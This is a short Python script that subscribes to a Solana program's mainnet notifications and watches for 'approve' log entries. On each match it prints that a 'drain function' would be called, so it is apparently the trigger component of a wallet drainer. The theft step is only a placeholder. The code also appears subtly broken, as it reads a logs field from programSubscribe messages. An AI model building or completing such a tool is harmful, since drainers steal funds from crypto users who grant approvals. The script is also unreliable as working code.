import asyncio
import json
from solana.rpc.async_api import AsyncClient
from solana.rpc.websocket_api import connect

PROGRAM_ID = "YOUR_PROGRAM_ID"

async def listen_approvals():
    async with connect("wss://api.mainnet-beta.solana.com") as websocket:
        await websocket.send(json.dumps({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "programSubscribe",
            "params": [
                PROGRAM_ID,
                {"encoding": "jsonParsed", "commitment": "confirmed"}
            ]
        }))
        print("Listening for approve transactions...")
        
        while True:
            try:
                msg = await websocket.recv()
                data = json.loads(msg)
                
                if 'method' in data and data['method'] == 'programNotification':
                    logs = data['params']['result']['value']['logs']
                    for log in logs:
                        if "approve" in log.lower():
                            print("Approve detected!")
                            print("Drain function will be called here.")
                else:
                    continue
                    
            except Exception as e:
                print(f"Error: {e}")
                continue

async def main():
    await listen_approvals()

if __name__ == "__main__":
    asyncio.run(main())
